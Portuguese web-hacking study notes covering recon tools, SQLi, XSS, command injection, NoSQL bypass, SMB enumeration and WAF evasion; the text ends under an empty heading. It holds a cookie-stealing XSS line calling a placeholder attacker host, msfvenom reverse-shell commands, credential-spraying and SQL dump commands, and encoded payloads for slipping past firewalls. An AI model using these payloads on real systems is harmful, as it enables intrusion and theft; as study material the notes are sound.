	# 📖 Essential Web Hacking

> Anotações de estudo sobre vulnerabilidades web, técnicas de reconhecimento e exploração.

---

## 🔎 Recon — Reconhecimento

> **Objetivo:** Mapear a superfície de ataque antes de procurar vulnerabilidades. Quanto mais informação coletamos, mais vetores de ataque aparecem.

### Subdomain Discovery
**subfinder** — [github.com/projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder)
Descobrir subdomínios de forma passiva (sem tocar o alvo diretamente).
- `-d` : Especificar o domínio alvo
- `-all` : Usa todas as fontes disponíveis
- `-silent` : Não exibe o banner/logo

### HTTP Probing
**httpx** — [github.com/projectdiscovery/httpx](https://github.com/projectdiscovery/httpx)
Verificar quais subdomínios estão ativos na web, status codes e tecnologias.
- `-sc` : Mostra o **Status Code** (200 = sucesso, 403 = proibido, 301 = redirect)
- `-td` : **Tech Detect** — identifica tecnologias rodando no site (Apache, Nginx, WordPress, etc.)

**aquatone** — [github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone)
Usado após o httpx para tirar screenshots automáticos de todos os subdomínios encontrados. Útil para análise visual rápida da superfície de ataque.

### URL Discovery & Crawling
**gau** — [github.com/lc/gau](https://github.com/lc/gau)
Busca URLs históricas de um domínio (Wayback Machine, Common Crawl, etc).

**katana** — [github.com/projectdiscovery/katana](https://github.com/projectdiscovery/katana)
Crawler moderno que percorre o site em tempo real buscando URLs e endpoints.
- `-u` : URL alvo
- `-d` : Profundidade do crawl (ex: 3 níveis)
- `-jc` : Ativa o crawler de arquivos **JavaScript** (**Essencial!** — APIs e endpoints são frequentemente definidos em JS)

### JavaScript Analysis
**SecretFinder** — [github.com/m4ll0k/SecretFinder](https://github.com/m4ll0k/SecretFinder)
Busca chaves de API, tokens, segredos e endpoints dentro de arquivos JavaScript.
- `-i [URL]` : URL do arquivo .js
- `-o cli` : Exibe resultado no terminal

### Parameter Discovery
**ParamSpider** — [github.com/devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider)
Descobre URLs que aceitam parâmetros (query strings) — fundamental para testar XSS, SQLi, LFI.

**kxss** — [github.com/tomnomnom/hacks/tree/master/kxss](https://github.com/tomnomnom/hacks/tree/master/kxss)
Recebe URLs com parâmetros e verifica se o valor reflete na resposta HTTP (indicador de XSS potencial). Usar junto com ParamSpider/gau.

### Vulnerability Scanning
**nuclei** — [github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei)
Scanner automatizado que usa templates para detectar vulnerabilidades conhecidas, misconfigurations, exposição de arquivos, CVEs, etc. É o canivete suíço do recon.

---

## 🔍 Fuzzing — Descoberta de Diretórios e Arquivos

> **Objetivo:** Encontrar diretórios, arquivos e endpoints ocultos no servidor que não são linkados na interface.

**Ferramentas:** [ffuf](https://github.com/ffuf/ffuf) / [wfuzz](https://wfuzz.readthedocs.io/en/latest/) + [SecLists](https://github.com/danielmiessler/SecLists)

**Exemplos de uso:**
```bash
# Fuzing de diretórios e extensões com wfuzz
wfuzz -c -z file,LISTA -z list,txt-php-html-bak-old --hc 404 --hw 194 ALVO.FUZ2Z

# Fuzzing de IDOR com cookie de sessão
wfuzz -c -z range,1-100 -H "Cookie: PHPSESSID=SUA_SESSAO" "http://ALVO/?action=home&user_id=FUZZ"

# Fuzzing de diretórios com ffuf
ffuf -u http://ALVO/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

> **Dica:** Sempre tente extensões como `.bak`, `.old`, `.swp`, `.env`, `.git` — desenvolvedores frequentemente esquecem esses arquivos no servidor.

---

## 📡 Port Scanning — Enumeração de Portas

> **Objetivo:** Descobrir quais portas e serviços estão ativos no servidor alvo.

**Ferramenta:** [nmap](https://nmap.org/)

| Flag | Função |
|---|---|
| `-sV` | Detecta versões dos serviços |
| `-p-` | Varre todas as 65.535 portas |
| `-sC` | Roda scripts NSE padrão de segurança |
| `-sS` | SYN scan (stealth — não completa o handshake) |
| `-A` | Modo agressivo (OS detection + scripts + versions) |
| `-Pn` | Pula detecção de host (útil se o alvo bloqueia ping) |

```bash
# Scan completo
nmap -sV -sC -p- ALVO

# Scan rápido das top 1000 portas
nmap -sV ALVO

# Scan stealth em todas as portas
nmap -sS -p- ALVO
```

**Portas importantes para ficar de olho:**
| Porta | Serviço | Interesse |
|---|---|---|
| 21 | FTP | Login anônimo? Versão vulnerável? |
| 22 | SSH | Brute force? Chaves expostas? |
| 80/443 | HTTP/HTTPS | Aplicação web principal |
| 3306 | MySQL | Banco de dados exposto? |
| 8080 | HTTP alt | Painel de admin? Tomcat? |
| 6379 | Redis | Acesso sem autenticação? |
| 27017 | MongoDB | Sem autenticação? |

---

## ⚡ Vulnerabilidades Web

---

### 🔍 XSS — Cross-Site Scripting

> **O que é:** Quando a aplicação permite que scripts JavaScript sejam executados no navegador da vítima porque o servidor não faz tratamento/sanitização da entrada do usuário.

**Impacto:** Roubo de cookies/sessão, keylogging, phishing, redirecionamento para sites maliciosos, manipulação do DOM.

#### XSS Reflected
Quando o servidor **devolve** o que o usuário enviou na resposta HTTP sem filtrar. O payload precisa ser enviado à vítima (via link malicioso, engenharia social). A execução **não é persistente** — só funciona quando a vítima clica no link.

> Ex: O site exibe `"Você buscou por: <script>alert(1)</script>"` — o script executa no browser da vítima.

#### XSS Stored
O payload é **armazenado** no servidor (em um comentário, campo de perfil, mensagem, etc.) e executado **toda vez** que alguém visualiza aquele conteúdo. Mais perigoso que o Reflected porque não precisa de engenharia social — qualquer usuário que acessar a página é afetado.

> Ex: Atacante coloca `<script>fetch('http://attacker/'+document.cookie)</script>` em um comentário. Todo mundo que carrega os comentários tem seu cookie roubado.

#### XSS DOM Based
O problema está no **front-end (JavaScript do cliente)**, não no servidor. O input do usuário é inserido diretamente no DOM via `innerHTML`, `document.write()`, `eval()`, jQuery `.html()`, etc., sem sanitização.

> Ex: A URL `?search=<img src=x onerror=alert(1)>` é inserida no DOM via `document.getElementById('result').innerHTML = param`.

#### Como se proteger (para entender a defesa):
- **Encoding de output** — Converter `<`, `>`, `"`, `'` para HTML entities
- **CSP (Content Security Policy)** — Header que restringe de onde scripts podem ser carregados
- **HttpOnly cookies** — Impede que JavaScript acesse cookies de sessão

---

### 💉 SQL Injection

> **O que é:** Quando o input do usuário é inserido diretamente em uma query SQL sem sanitização, permitindo que o atacante manipule o banco de dados.

**Impacto:** Leitura total do banco, bypass de autenticação, escrita de arquivos no servidor (webshell), execução de comandos (RCE).

#### Conceitos fundamentais de SQL
| Comando | Função |
|---|---|
| `SELECT` | Seleciona/lê dados de uma tabela |
| `INSERT` | Insere novos registros |
| `UPDATE` | Atualiza registros existentes |
| `DELETE` | Remove registros |
| `UNION` | Combina resultados de duas queries |
| `ORDER BY` | Ordena resultados (usado para descobrir nº de colunas) |

#### Metodologia de exploração manual
1. **Detectar a vulnerabilidade** — Inserir `'` e observar se causa erro
2. **Descobrir nº de colunas** — `ORDER BY 1`, `ORDER BY 2`... até dar erro
3. **Identificar colunas visíveis** — `UNION SELECT 1,2,3...` e ver quais números aparecem na página
4. **Fingerprint** — `@@version`, `database()`, `user()` para identificar o banco
5. **Enumerar tabelas** — Via `information_schema.tables`
6. **Enumerar colunas** — Via `information_schema.columns`
7. **Extrair dados** — `UNION SELECT username, password FROM users`
8. https://dencode.com/string/unicode-escape site para codificar as payloads

#### information_schema
Banco de **metadados** padrão que guarda os nomes de **todas** as tabelas e colunas do sistema. É a chave para descobrir a estrutura do banco.

```sql
-- Listar tabelas do banco atual
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --

-- Listar colunas de uma tabela específica
') UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_name = 'users' -- -
```

> **⚠️ Regra de ouro:** Para o `UNION` funcionar, a injeção DEVE ter **exatamente o mesmo número de colunas** que a query original da página.

#### SQLMap — Automação
Sequência clássica passo a passo:
```bash
sqlmap -u "http://alvo.com/page?id=1" --banner           # Fingerprint do banco
sqlmap -u "http://alvo.com/page?id=1" --dbs               # Listar databases
sqlmap -u "http://alvo.com/page?id=1" -D BANCO --tables   # Listar tabelas
sqlmap -u "http://alvo.com/page?id=1" -D BANCO -T TABELA --columns  # Listar colunas
sqlmap -u "http://alvo.com/page?id=1" -D BANCO -T TABELA -C user,password --dump  # Extrair dados
```

---

### 🐚 SQL Injection → WebShell

> **O que é:** Usar SQL Injection não apenas para ler dados, mas para **escrever arquivos** no servidor (via `INTO OUTFILE`) e obter execução de comandos (RCE).

**Requisitos:** O usuário MySQL precisa do privilégio `FILE` e `secure_file_priv` deve estar desabilitado ou apontando para o diretório web.

> **Importante:** `INTO OUTFILE` **não sobrescreve** arquivos existentes — sempre crie um nome novo!

**Fluxo de ataque:**
1. Identificar colunas e banco (como no SQLi normal)
2. Escrever uma webshell PHP via `INTO OUTFILE`
3. Acessar a webshell pelo navegador
4. Fazer upgrade para shell interativa

**Upgrade para shell interativo (após obter RCE):**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
SHELL=/bin/bash script -q /dev/null
# Ctrl+Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

---

### ⏱️ SQL Injection — Time-Based Blind

> **O que é:** Quando a aplicação é vulnerável a SQLi mas **não exibe** os resultados na página (nem erros, nem dados). A única forma de extrair informação é observando o **tempo de resposta** do servidor.

**Como funciona:**
- Usamos `IF()` com `SLEEP()` para fazer perguntas ao banco
- Se a resposta demora (ex: 5 segundos) → a condição é **verdadeira**
- Se responde instantaneamente → a condição é **falsa**

**Conceitos-chave:**
- `SUBSTRING(string, posição, tamanho)` — Extrai parte de uma string, caractere por caractere
- `IF(condição, verdade, falso)` — Condicional que decide se vai executar o `SLEEP`
- Combinando os dois: `IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)` — "O primeiro caractere do nome do banco é 'a'? Se sim, espere 5 segundos."

> Na prática, esse processo é **muito lento manualmente** (um caractere por vez). Por isso existem scripts automatizados e o próprio SQLMap.

---

### 🖥️ Command Injection

> **O que é:** Quando a aplicação executa comandos do sistema operacional usando input do usuário sem sanitizar. Permite rodar **qualquer comando** no servidor.

**Como funciona:** A aplicação pega o input e passa para uma função como `system()`, `exec()`, `os.popen()`, `subprocess.run()`, etc. Se o input não é filtrado, podemos "quebrar" o comando original e injetar o nosso.

**Separadores de comando:**
| Separador | Comportamento |
|---|---|
| `;` | Executa sequencialmente (independente do resultado) |
| `&&` | Executa o segundo **apenas se** o primeiro for bem-sucedido |
| `\|\|` | Executa o segundo **apenas se** o primeiro falhar |
| `\|` | Pipe — envia a saída para o próximo comando |
| `` ` `` | Backticks — substitui pela saída do comando |
| `$()` | Substituição de processo (alternativa moderna aos backticks) |

**Exemplo real:** Se a aplicação faz `ping <input>`:
```
Input: 127.0.0.1; cat /etc/passwd
Resultado: O ping executa E o cat também
```

> **Dica para CTFs:** Se `;`, `&&` e `|` são bloqueados, tente **backticks** (`` ` ``) ou `$()`. Se caracteres como `>` ou `/dev/tcp` são bloqueados, use **base64 encoding** para entregar o payload (como na máquina Retro.hc).

---

### 🔄 CSRF — Cross-Site Request Forgery

> **O que é:** O atacante faz o navegador da vítima **executar ações** em um site onde ela já está autenticada, sem que ela saiba. O browser envia automaticamente os cookies de sessão, validando a ação.

**Como funciona:**
1. Vítima está logada no site `alvo.com`
2. Vítima visita uma página maliciosa do atacante
3. A página maliciosa contém um formulário oculto que submete automaticamente para `alvo.com/change-password`
4. O navegador envia a requisição com o cookie de sessão da vítima → senha alterada!

**Condições necessárias para o ataque funcionar:**
- A ação no alvo é baseada **apenas em cookies** (sem token CSRF)
- O cookie **não tem** `SameSite=Strict` ou `SameSite=Lax` (para POST requests)
- A vítima precisa estar logada no momento do ataque

> **Defesas comuns:** Token CSRF (valor único por sessão/formulário), `SameSite` cookie attribute, verificação do header `Referer/Origin`.

---

### 📁 LFI — Local File Inclusion

> **O que é:** Quando a aplicação inclui/lê arquivos locais do servidor usando um parâmetro controlado pelo usuário. Navegando com `../` (path traversal), conseguimos ler arquivos sensíveis.

**Como identificar:** Procurar parâmetros que pareçam referenciar arquivos:
```
http://alvo.com/page?file=home.php
http://alvo.com/index.php?page=about
http://alvo.com/view?doc=manual.pdf
```
Se mudar para `../../etc/passwd` e o servidor retorna o conteúdo do arquivo → é LFI.

**Escalar LFI para RCE:**
- **Log Poisoning** — Injetar PHP no User-Agent (que vai para os logs), depois incluir o log via LFI
- **PHP Wrappers** — `php://input`, `data://`, `expect://` para executar código
- **Session injection** — Injetar código na sessão PHP e incluir o arquivo de sessão

> **Dica:** Use o DevTools (F12) para ver se parâmetros estão sendo passados na URL ou em requisições AJAX — muitas vezes o LFI está escondido em chamadas assíncronas.

---

### 🗄️ NoSQL Injection

> **O que é:** Equivalente ao SQL Injection, mas para bancos **não-relacionais** como MongoDB. Em vez de queries SQL, manipulamos **operadores** do banco.

#### Diferença SQL vs NoSQL

**SQL (Relacional):**
```sql
SELECT * FROM users WHERE username='admin' AND password='senha';
```
Mais verificações, mais estruturado, mais lento.

**NoSQL (Não-Relacional — ex: MongoDB):**
Usa operadores de comparação em vez de SQL:

| Operador | Significado |
|---|---|
| `$eq` | Igual a |
| `$ne` | **Não** igual a (usado para bypass!) |
| `$gt` | Maior que |
| `$gte` | Maior ou igual |
| `$lt` | Menor que |
| `$in` | Contido em um array |
| `$regex` | Corresponde a expressão regular |

#### Bypass de Autenticação
A lógica: Se o banco verifica `username == X AND password == Y`, podemos usar `$ne` (not equal) para fazer `username != NADA AND password != NADA` → qualquer usuário com qualquer senha satisfaz!

**Via JSON (Burp Suite):**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": "x"}}
```

**Via PHP array (formulários):**
```
username[$ne]=nada&password[$ne]=nada
```
> Podemos iterar combinações com `$regex` para descobrir usuário e senha caractere por caractere — processo similar ao Blind SQLi.

**Ferramenta:** Burp Suite para interceptar, visualizar e manipular as requisições.

---

### 🔐 IDOR — Insecure Direct Object Reference

> **O que é:** Quando a aplicação usa **referências diretas** (IDs, nomes de arquivo) para acessar recursos, e não verifica se o usuário tem **permissão** para acessar aquele recurso específico.

**Exemplo prático:** Você está logado como User ID 12 e acessa:
```
GET /api/user/12/profile  → Seu perfil ✅
GET /api/user/13/profile  → Perfil de OUTRA pessoa? Se funcionar → IDOR! 🚨
```

**Onde testar:**
- IDs numéricos sequenciais em URLs (`?id=1`, `?id=2`, `?id=3`)
- IDs em cookies ou headers
- IDs em requisições POST (corpo JSON ou form data)
- Filenames em downloads (`/download?file=meu_doc.pdf` → `outro_doc.pdf`)
- Métodos HTTP diferentes (`GET` funciona, mas `PUT /api/users/1` com `{"role":"admin"}` também?)

> **Ferramenta útil:** wfuzz/ffuf para enumerar IDs automaticamente com range.

---

### 🌐 Subdomain Takeover

> **O que é:** Quando um subdomínio do alvo aponta (via CNAME DNS) para um **serviço externo** que não está mais ativo (S3 bucket deletado, Heroku app removido, etc.). O atacante pode reivindicar esse recurso e hospedar conteúdo malicioso no subdomínio legítimo do alvo.

**Como explorar:**
1. Enumerar subdomínios (subfinder)
2. Verificar CNAME com `dig` ou `nslookup`
3. Se o CNAME aponta para um serviço desativado → reivindicar

**Ferramentas:** `subfinder` + `httpx`, `nuclei -t takeovers/`

---

### ⚙️ Security Misconfiguration

> **O que é:** Quando o servidor, aplicação ou serviço está configurado de forma insegura — credenciais padrão, painéis de admin expostos, directory listing habilitado, serviços desnecessários ativos, etc.

**Exemplos comuns:**
- Tomcat com credenciais padrão (`tomcat:tomcat`) → Deploy de WAR malicioso
- Apache com directory listing → Exposição de arquivos
- `.git/` exposto no servidor → Download do código-fonte
- Debug mode ativado em produção → Stack traces com informações sensíveis
- Credenciais padrão em serviços (Redis sem senha, MongoDB sem auth)

**Gerar Reverse Shell com msfvenom:**
```bash
# WAR (para Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f war -o shell.war

# PHP
msfvenom -p php/reverse_php LHOST=SEU_IP LPORT=4444 -f raw -o shell.php

# Linux ELF
msfvenom -p linux/x86/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f elf -o shell
```

---

### 🔗 API REST

> **O que é:** Uma interface que permite comunicação entre sistemas usando métodos HTTP (GET, POST, PUT, DELETE). APIs mal configuradas podem expor dados sensíveis, permitir escalação de privilégios, ou aceitar operações não autorizadas.

**Como encontrar APIs:**
- Fuzzing de endpoints (ffuf/wfuzz com wordlists de API)
- Análise de requisições no DevTools/Burp Suite
- Análise de arquivos JavaScript (SecretFinder)

**O que testar:**
- **Autenticação** — Endpoints sem autenticação? Token fraco?
- **Autorização** — Pode acessar dados de outros usuários? (IDOR)
- **Métodos HTTP** — GET funciona, mas e PUT/DELETE/PATCH?
- **Headers manipuláveis** — `X-Admin: true`, `X-User-Id: 1`, `X-Forwarded-For: 127.0.0.1`
- **Mass Assignment** — Enviar campos extras como `"role": "admin"` no POST/PUT

---

### 🔮 API GraphQL

> **O que é:** Linguagem de query para APIs que permite consultas flexíveis e eficientes. Diferente de REST, o cliente define **exatamente** quais dados quer receber.

**Principal vetor de ataque: Introspection**
GraphQL permite que você **descubra todo o schema** (tipos, queries, mutations) com uma única query. Se a introspection não está desabilitada → exposição total da estrutura da API.

**Ferramentas:** GraphQL Voyager para visualizar o schema graficamente após extrair a introspection.

> **Vulnerabilidades comuns:** Falta de rate limiting, queries aninhadas para DoS (query batching), falta de autorização por campo, introspection ativada em produção.

---

### 🌐 SSRF — Server-Side Request Forgery

> **O que é:** Quando conseguimos fazer o **servidor** enviar requisições HTTP para destinos que **nós controlamos**. Permite acessar serviços internos (que não são acessíveis de fora), metadados de cloud (AWS/GCP/Azure), e até interagir com Redis/MySQL internos.

**Quando testar:** Sempre que a aplicação aceitar uma URL como input (importar imagem de URL, webhook, preview de link, PDF generator, etc.)

**Perigo em Cloud:** Em AWS, o endpoint `http://169.254.169.254/latest/meta-data/` retorna credenciais IAM, chaves de acesso e informações sensíveis da instância.

---

### 📄 XXE — XML External Entity

> **O que é:** Quando a aplicação processa XML e não desabilita entidades externas. Permite ler arquivos do servidor, fazer SSRF e, em alguns casos, RCE.

**Onde aparece:** Upload de arquivos XML, SVG, DOCX/XLSX (que são ZIPs contendo XML internamente), APIs SOAP, configurações de aplicação.

**Conceito-chave:** Entidades XML funcionam como variáveis — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` cria uma "variável" que contém o conteúdo do arquivo, e ao referenciar `&xxe;` no XML, o conteúdo é incluído.

---

### 📤 File Upload Bypass

> **O que é:** Quando a aplicação permite upload de arquivos e tenta filtrar extensões perigosas, mas o filtro pode ser bypassed para enviar uma webshell.

**Técnicas de bypass:** Extensões alternativas (.phtml, .php5), double extension (.php.jpg), magic bytes (GIF89a), Content-Type falso, .htaccess upload, null byte.

> **Regra:** Sempre que encontrar um upload, teste! Mesmo que pareça aceitar "só imagens".

---

### 🔑 JWT — JSON Web Token

> **O que é:** Tokens usados para autenticação stateless. São compostos por `HEADER.PAYLOAD.SIGNATURE` em base64. Se mal configurados, podem ser forjados.

**Ataques principais:**
- `alg: none` — Remove a verificação de assinatura
- **Brute force** do secret com hashcat/john
- **Key confusion** — Trocar RS256 por HS256 e assinar com a chave pública

---

### 🧩 SSTI — Server-Side Template Injection

> **O que é:** Quando input do usuário é inserido diretamente em um template engine (Jinja2, Twig, ERB) e processado como código. Pode levar a RCE.

**Detecção:** Enviar `{{7*7}}` — se retorna `49`, o template está processando a expressão.

---

### 🧬 Insecure Deserialization

> **O que é:** Quando a aplicação desserializa dados controlados pelo usuário sem validação. Permite manipular objetos e, frequentemente, executar código arbitrário.

**Onde aparece:** Cookies serializados, dados em base64 em parâmetros, APIs que recebem objetos serializados (Java, PHP, Python pickle).

---

### ↩️ Open Redirect

> **O que é:** Quando a aplicação redireciona para URLs externas sem validação. Usado para phishing sofisticado (a URL parece legítima porque começa com o domínio do alvo) e para roubo de tokens OAuth.

**Parâmetros comuns:** `?redirect=`, `?url=`, `?next=`, `?return=`, `?redirect_uri=`

---

### 🔴 SQL Injection — Error-Based

> **O que é:** Variação do SQL Injection onde o atacante **induz o banco a gerar mensagens de erro** que contêm os dados sensíveis. É mais rápido que o Time-Based porque não depende de delay — a resposta chega imediatamente contendo a informação escondida dentro do erro SQL.

**Quando usar:** Quando a aplicação exibe mensagens de erro SQL (mesmo que genéricas) na resposta HTTP. Não funciona se o servidor tem `APP_DEBUG=false` e suprime todos os erros (nesse caso, use Time-Based).

**Funções principais (MySQL):**

| Função | O que faz |
|---|---|
| `extractvalue()` | Faz uma query XPath num XML. Se o XPath for inválido, o MySQL gera um erro contendo o valor da expressão avaliada |
| `updatexml()` | Atualiza um XML. Mesmo mecanismo — erro XPath vaza o dado |
| `concat()` | Concatena strings — usado para montar o payload dentro do erro |
| `0x7e` | Valor hexadecimal do caractere `~` — serve como separador visual nos erros |

**Como funciona na prática:**
```sql
-- Extrair banco de dados atual via erro XPath
' AND extractvalue(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- -

-- O MySQL lança um erro do tipo:
-- XPATH syntax error: '~nome_do_banco~'
-- O dado está no próprio erro!
```

> **Limitação:** O MySQL trunca a string de erro em ~32 caracteres. Para extrair strings longas, use `SUBSTRING()` em loop.

> **Em hacking:** Se a resposta contém palavras como `XPATH syntax error`, `extractvalue`, ou qualquer stack trace de banco, tente imediatamente error-based antes de partir para time-based. É ordens de magnitude mais rápido.

---

### 🖧 SMB — Server Message Block

> **O que é:** Protocolo de compartilhamento de arquivos e impressoras em redes locais (Windows/Linux via Samba). Permite que máquinas compartilhem pastas, arquivos e dispositivos pela rede. Portas padrão: **139** (NetBIOS) e **445** (SMB direto).

**Por que interessa em hacking:**
- Compartilhamentos com acesso anônimo (null session) → leitura/escrita sem senha
- Credenciais fracas → acesso autenticado a diretórios home, backups, configs
- Versões antigas (SMBv1) → vulnerabilidades críticas como EternalBlue (MS17-010)
- Compartilhamentos com permissão de WRITE → plantar arquivos maliciosos (`.lnk`, scripts)

**Metodologia de ataque:**

```
1. Nmap → descobrir portas 139/445 abertas
2. Enumerar compartilhamentos (anônimo primeiro)
3. Tentar autenticar com credenciais encontradas (reuso de senha!)
4. Listar arquivos, ler configs, plantar payloads
```

**Ferramentas:**

| Ferramenta | Uso principal |
|---|---|
| `smbclient` | Conectar e navegar em compartilhamentos (como um FTP) |
| `smbmap` | Enumerar compartilhamentos e permissões de forma rápida |
| `nxc` (NetExec) | Autenticação, enum de shares, execução de comandos |
| `hydra` | Brute force de credenciais SMB |
| `enum4linux` | Enumeração completa: users, shares, políticas, grupos |

**Enumeração básica:**
```bash
# Verificar compartilhamentos sem autenticação (null session)
smbclient -L //ALVO -N

# Tentar conectar anonimamente em um share
smbclient //ALVO/NOME_DO_SHARE -N

# Verificar permissões de todos os shares
smbmap -H ALVO -u "" -p ""

# Enumeração completa
enum4linux -a ALVO
```

**Autenticação com credenciais:**
```bash
# Listar shares com usuário e senha
smbclient -L //ALVO -U usuario%senha

# Conectar em um share específico
smbclient //ALVO/home -U usuario%senha

# Validar credenciais e listar shares (com NetExec)
nxc smb ALVO -u usuario -p senha --shares

# Spray de credenciais em vários usuários
nxc smb ALVO -u users.txt -p senha --continue-on-success
```

**Dentro do smbclient (comandos):**
```bash
ls              # Listar arquivos
get arquivo.txt # Baixar arquivo
put shell.php   # Enviar arquivo
cd pasta/       # Navegar
mget *          # Baixar todos os arquivos
```

> **Em hacking:** Sempre que encontrar credenciais (em `.env`, banco de dados, hash crackeado, etc.), teste no SMB imediatamente — **reuso de senha é extremamente comum**. Um `DB_PASSWORD` ou `MAIL_PASSWORD` pode ser a senha do sistema inteiro.

---

### 🛡️ WAF Bypass — Contornando Web Application Firewalls

> **O que é:** Um WAF (Web Application Firewall) é um sistema que fica **na frente** da aplicação web, analisando cada requisição HTTP e decidindo se ela é legítima ou maliciosa. Se o WAF detectar algo suspeito, ele **bloqueia** a requisição antes que ela chegue ao backend. Pense nele como um segurança de boate que olha cada pessoa na fila e barra quem parece perigoso.

**Onde você vai encontrar WAFs:**
- Praticamente toda aplicação real em produção. Em Bug Bounties, CTFs intermediários/avançados, e pentests profissionais, o WAF é a primeira barreira.
- Serviços como **Cloudflare**, **AWS WAF**, **Akamai Kona**, **Imperva/Incapsula**, **Sucuri**, **ModSecurity (open-source)**, **Fortinet FortiWeb**, **F5 BIG-IP ASM**.

> **A mentalidade essencial:** WAF bypass não é sobre "decorar payloads mágicos". É sobre **entender como o WAF pensa** e explorar as lacunas entre a forma como o WAF interpreta a requisição e a forma como a aplicação/banco de dados interpreta a mesma requisição. Toda vez que existe uma diferença de interpretação, existe um vetor de bypass.

---

#### Como um WAF funciona internamente

Para contornar algo, você precisa entender como ele opera. WAFs usam uma ou mais dessas técnicas para decidir o que bloquear:

| Mecanismo | Como funciona | Fraqueza |
|---|---|---|
| **Regex (padrões)** | Procura padrões como `UNION SELECT`, `<script>`, `../` no payload | Qualquer variação que quebre o padrão (case, encoding, comentários) engana o regex |
| **Assinatura (blacklist)** | Lista de payloads conhecidos. Se a requisição contém algo da lista, bloqueia | Payloads novos ou ofuscados não estão na lista |
| **Heurística** | Analisa comportamento (ex: muitas aspas, parênteses, ponto-e-vírgula) | Payloads minimalistas que parecem "normais" passam |
| **Scoring (pontuação)** | Cada parte suspeita da requisição ganha pontos. Se a soma passa de um threshold, bloqueia | Dividir o ataque em partes menores pode manter o score baixo |
| **Machine Learning** | Modelos treinados em tráfego normal e malicioso | Podem ser enganados com payloads que se parecem com tráfego legítimo |

> **Conceito-chave: "Normalização assimétrica"** — O WAF e a aplicação **decodificam** a requisição de formas diferentes. Exemplo: o WAF pode decodificar URL encoding uma vez, mas o Apache decodifica duas vezes. Se você usar double encoding, o WAF vê `%2527` (que parece inofensivo), mas a aplicação decodifica para `%27` e depois para `'` (aspas). Essa assimetria é o coração do WAF bypass.

---

#### Antes de tudo: Identificar o WAF

> Nunca tente bypass às cegas. Saber **qual** WAF está à frente muda completamente a estratégia.

**Como detectar:**

1. **Enviar um payload óbvio** e observar a resposta:
   - Se retornar `403 Forbidden` com página customizada → WAF
   - Procure textos como "Access Denied", "Request Blocked", "Not Acceptable"
   - Headers de resposta reveladores: `CF-Ray` (Cloudflare), `X-Sucuri-ID` (Sucuri), `X-CDN` (Akamai)

2. **Usar ferramenta automatizada:**
   - `wafw00f http://alvo.com` — identifica o WAF automaticamente
   - `nmap --script http-waf-detect,http-waf-fingerprint -p 80,443 alvo.com`

3. **Comparar respostas:**
   - Envie uma requisição normal → anote o tamanho e status
   - Envie a mesma requisição com `' OR 1=1--` → se o comportamento mudar drasticamente (403, redirect, tamanho diferente), tem WAF

> **Em hacking:** Identifique o WAF ANTES de gastar tempo testando payloads. Cada WAF tem fraquezas conhecidas, e saber qual é direciona seu ataque.

---

#### O Arsenal de Bypass: Categorias de Técnicas

As técnicas de bypass se dividem em **camadas**. Comece pela mais simples e escale a complexidade conforme necessário.

---

##### Camada 1: Encoding — Falar a mesma coisa em outra língua

> **Princípio:** O WAF filtra o payload em um formato, mas a aplicação decodifica múltiplos formatos. Se você codificar o payload de uma forma que o WAF não reconhece mas o backend processa normalmente, o ataque passa.

**URL Encoding:** O mais básico. O WAF pode filtrar `'` mas não `%27`.
```
' OR 1=1 --  →  %27%20OR%201%3D1%20--
```

**Double URL Encoding:** O WAF decodifica `%25` para `%`, resultando em `%27`, e para por aí. Mas o backend decodifica **de novo** e chega em `'`.
```
' OR 1=1 --  →  %2527%2520OR%25201%253D1%2520--
```

**Unicode/UTF-8 Overlong:** Representações alternativas do mesmo caractere em UTF-8. Os filtros procuram `'` (`0x27`), mas `%C0%A7` é outra representação válida do mesmo caractere.
```
'  →  %C0%A7  ou  %EF%BC%87 (fullwidth apostrophe)
/  →  %C0%AF  ou  %E0%80%AF
```

**Hex Encoding (SQL):** Dentro do SQL, strings podem ser representadas em hexadecimal. O WAF não reconhece, mas o MySQL decodifica normalmente.
```sql
-- Em vez de WHERE table_name='users'
WHERE table_name=0x7573657273
-- O MySQL lê exatamente a mesma coisa!
```

**HTML Entities (XSS):** O browser interpreta entities, o WAF muitas vezes não.
```html
alert(1)  →  &#97;&#108;&#101;&#114;&#116;(1)
```

> **Analogia real:** Imagina que o segurança da boate não deixa entrar quem fala "eu quero brigar" em português. Você diz a mesma coisa em japonês — o segurança não entende, mas as pessoas dentro do prédio entendem perfeitamente.

---

##### Camada 2: Manipulação de Whitespace — Espaço não é só espaço

> **Princípio:** WAFs frequentemente usam **espaço literal** como delimitador de tokens para parsear payloads. Mas SQL, HTML e shells aceitam dezenas de caracteres como "espaço equivalente".

| Caractere | URL Encoded | Nome |
|---|---|---|
| TAB | `%09` | Horizontal Tab |
| Line Feed | `%0A` | Newline |
| Vertical Tab | `%0B` | Vertical Tab |
| Form Feed | `%0C` | Form Feed |
| Carriage Return | `%0D` | CR |
| Non-breaking Space | `%A0` | NBSP |
| Comentário SQL | `/**/` | Inline Comment |

```sql
-- Ao invés de espaço normal:
' UNION SELECT 1,2,3 --
-- Substituir por TAB:
'%09UNION%09SELECT%091,2,3--
-- Ou por comentário SQL:
'/**/UNION/**/SELECT/**/1,2,3--
-- Ou por parênteses (não precisam de espaço):
'UNION(SELECT(1),(2),(3))--
```

> **Por que funciona:** O WAF faz tokenização do input. Se ele espera `ESPAÇO + UNION + ESPAÇO + SELECT`, mas recebe `TAB + UNION + COMENTÁRIO + SELECT`, o parser do WAF não forma os tokens corretos. Mas o MySQL aceita qualquer whitespace entre keywords.

---

##### Camada 3: Fragmentação de Keywords — Quebrar as palavras no caminho

